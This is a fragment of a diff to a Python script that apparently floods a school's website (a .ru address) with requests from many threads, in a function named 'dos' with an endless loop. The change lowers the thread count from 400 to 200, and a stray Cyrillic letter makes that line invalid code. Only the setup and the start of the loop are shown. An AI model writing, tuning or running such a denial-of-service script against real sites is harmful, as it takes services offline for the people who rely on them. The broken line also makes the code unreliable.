@@ -3,7 +3,7 @@ import threading
 import requests
 
 url = "http://school152-krs.ru/"
-threads = 400
+threads = 200ы
 
 def dos(target):
     while True:
